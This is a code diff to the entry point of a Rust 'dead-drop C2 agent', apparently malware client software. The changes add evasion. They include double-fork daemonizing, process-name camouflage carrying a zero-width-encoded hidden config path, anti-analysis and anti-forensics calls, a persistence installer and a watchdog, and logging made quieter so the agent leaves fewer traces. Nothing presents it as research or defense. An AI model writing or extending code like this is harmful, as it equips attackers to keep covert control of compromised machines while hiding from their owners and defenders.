@@ -1,28 +1,24 @@
-//! ArcticFox C3 Agent — main entry point.
+//! C3 Agent — main entry point.
 //!
 //! Command-line interface for the dead-drop C2 agent.
+//! In daemon mode, performs double-fork + setsid + fd redirect.
 
 use clap::Parser;
 use std::path::PathBuf;
 use tokio::sync::watch;
-use tracing::{error, info};
+use tracing::{debug, error, info};
 use tracing_subscriber::EnvFilter;
 
 use arcticfox_agent::{Agent, install_persistence};
 
-/// ArcticFox C3 Agent — Async Dead-Drop C2 Client
 #[derive(Parser)]
-#[command(name = "arcticfox-agent", version, about)]
+#[command(name = "agent", version, about)]
 struct Cli {
-    /// Repos to monitor (format: [gh:|gl:|dp:]owner/repo[:branch])
-    #[arg(short = 'r', long = "repo", value_name = "REPO_SPEC")]
-    repos: Vec<String>,
-
-    /// Path to config file
+    /// Path to config file (ZW-encoded in /proc via stealth-name on watchdog mode)
     #[arg(short = 'c', long = "config", default_value = "pb_config.json")]
     config: PathBuf,
 
-    /// Run in daemon mode (background)
+    /// Run in daemon mode (background with double-fork)
     #[arg(long)]
     daemon: bool,
 
@@ -42,8 +38,8 @@ struct Cli {
     #[arg(long)]
     bot_id: Option<String>,
 
-    /// Stealth: camouflage process name
-    #[arg(long = "stealth-name")]
+    /// Stealth: camouflage process name (may contain ZW-encoded config path)
+    #[arg(long = "name")]
     stealth_name: Option<String>,
 
     /// Watchdog mode — monitors a parent PID
@@ -51,19 +47,47 @@ struct Cli {
     watchdog: bool,
 
     /// Parent PID for watchdog
-    #[arg(long = "parent-pid")]
+    #[arg(long = "ppid")]
     parent_pid: Option<u32>,
 }
+
+#[cfg(target_os = "linux")]
+fn daemonize() {
+    // Double-fork to detach from terminal
+    unsafe {
+        if libc::fork() != 0 {
+            std::process::exit(0);
+        }
+        libc::setsid();
+        if libc::fork() != 0 {
+            std::process::exit(0);
+        }
+        // Redirect stdin/stdout/stderr to /dev/null
+        let devnull = libc::open(b"/dev/null\0".as_ptr() as *const libc::c_char, libc::O_RDWR);
+        if devnull >= 0 {
+            libc::dup2(devnull, 0);
+            libc::dup2(devnull, 1);
+            libc::dup2(devnull, 2);
+            if devnull > 2 { libc::close(devnull); }
+        }
+    }
+}
+
+#[cfg(not(target_os = "linux"))]
+fn daemonize() {}
 
 #[tokio::main]
 async fn main() {
     let cli = Cli::parse();
 
-    // Initialize tracing
+    if cli.daemon {
+        daemonize();
+    }
+
     let env_filter = if cli.verbose {
         EnvFilter::new("debug")
     } else if cli.daemon {
-        EnvFilter::new("info")
+        EnvFilter::new("warn")
     } else {
         EnvFilter::new("arcticfox_agent=info,arcticfox_core=warn")
     };
@@ -71,34 +95,56 @@ async fn main() {
     tracing_subscriber::fmt()
         .with_env_filter(env_filter)
         .with_target(false)
+        .with_writer(std::io::stderr)
         .init();
 
-    // ── Stealth: camouflage process name early ────────────────────────
-    let stealth_name = cli.stealth_name
-        .or_else(|| Some(arcticfox_agent::stealth::random_service_name().to_string()))
-        .unwrap();
+    // ── Stealth: camouflage + extract ZW data from name ───────────────────
+    let raw_name = cli.stealth_name
+        .unwrap_or_else(|| arcticfox_agent::stealth::random_service_name().to_string());
+
+    // Extract visible name + ZW-encoded config path from stealth_name
+    let config_zw_path = arcticfox_agent::stealth::extract_zw_data(&raw_name);
+    let (stealth_name, config_override) = if let Some(zw) = config_zw_path {
+        (arcticfox_core::zwcodec::strip(&raw_name), Some(String::from_utf8_lossy(&zw).to_string()))
+    } else {
+        (raw_name, None)
+    };
+
+    // Override config path if ZW-encoded one was found in stealth_name
+    let config_path: PathBuf = config_override.map(PathBuf::from).unwrap_or(cli.config);
+
     arcticfox_agent::stealth::camouflage_process_name(&stealth_name);
     arcticfox_agent::stealth::set_process_title(&stealth_name);
 
-    // ── Watchdog mode ─────────────────────────────────────────────────
+    // ── Anti-analysis / anti-forensics ────────────────────────────────────
+    arcticfox_agent::anti_analysis::detect_hostile_environment();
+    arcticfox_agent::anti_forensics::deploy_anti_forensics(
+        &stealth_name,
+        &std::env::current_exe()
+            .unwrap_or_else(|_| std::path::PathBuf::from("."))
+            .display()
+            .to_string(),
+    );
+
+    // ── Watchdog mode ─────────────────────────────────────────────────────
     if cli.watchdog {
         if let Some(ppid) = cli.parent_pid {
             let agent_path = cli.agent_path.unwrap_or_else(|| {
-                std::env::current_exe().unwrap_or_else(|_| PathBuf::from("arcticfox-agent"))
+                std::env::current_exe().unwrap_or_else(|_| PathBuf::from("."))
             });
-            arcticfox_agent::stealth::watchdog_loop(ppid, agent_path, cli.config).await;
+            arcticfox_agent::stealth::watchdog_loop(ppid, agent_path, config_path).await;
             return;
         }
-        error!("Watchdog mode requires --parent-pid");
+        error!("Watchdog mode requires --ppid");
         std::process::exit(1);
     }
 
     // Install persistence and exit
     if cli.install {
         let agent_path = cli.agent_path.unwrap_or_else(|| {
-            std::env::current_exe().unwrap_or_else(|_| PathBuf::from("arcticfox-agent"))
+            std::env::current_exe().unwrap_or_else(|_| PathBuf::from("."))
         });
-        if let Err(e) = install_persistence(&agent_path, &cli.config) {
+        if let Err(e) = install_persistence(&agent_path, &config_path) {
             error!("Failed to install persistence: {e}");
             std::process::exit(1);
         }
@@ -107,7 +153,7 @@ async fn main() {
     }
 
     // Load config
-    let mut config = match arcticfox_core::config::AgentConfig::load(&cli.config) {
+    let config = match arcticfox_core::config::AgentConfig::load(&config_path) {
         Ok(cfg) => cfg,
         Err(e) => {
             error!("Failed to load config: {e}");
@@ -115,49 +161,24 @@ async fn main() {
         }
     };
 
-    // Add repos from command line
-    for spec in &cli.repos {
-        match arcticfox_core::repo::parse_repo_spec(spec) {
-            Ok(rt) => {
-                config.repos.push(arcticfox_core::config::RepoSource {
-                    owner: rt.owner,
-                    repo: rt.repo,
-                    platform: rt.platform,
-                    branch: rt.branch,
-                    file_path: rt.file_path,
-                    active: true,
-                    fail_count: 0,
-                    last_success: 0.0,
-                    last_fail: 0.0,
-                });
-            }
-            Err(e) => {
-                error!("Invalid repo spec '{}': {}", spec, e);
-            }
-        }
-    }
-
     // Validate config
     if config.repos.is_empty() {
-        error!("No repos configured. Use -r to add repos or provide a config file.");
+        error!("No repos configured in config file");
         std::process::exit(1);
     }
 
-    info!("Loaded {} repos", config.repos.len());
+    debug!("Loaded {} repos", config.repos.len());
 
     // Set up shutdown signal
     let (shutdown_tx, shutdown_rx) = watch::channel(false);
-    
-    // Handle Ctrl+C
     let shutdown_tx_clone = shutdown_tx.clone();
     tokio::spawn(async move {
         tokio::signal::ctrl_c().await.ok();
-        info!("Received shutdown signal");
         shutdown_tx_clone.send(true).ok();
     });
 
     // Create and run agent
-    let agent = match Agent::new(config, cli.bot_id, cli.config).await {
+    let agent = match Agent::new(config, cli.bot_id, config_path).await {
         Ok(a) => a,
         Err(e) => {
             error!("Failed to initialize agent: {e}");
@@ -170,5 +191,5 @@ async fn main() {
         std::process::exit(1);
     }
 
-    info!("Agent exited cleanly");
+    debug!("Agent exited cleanly");
 }
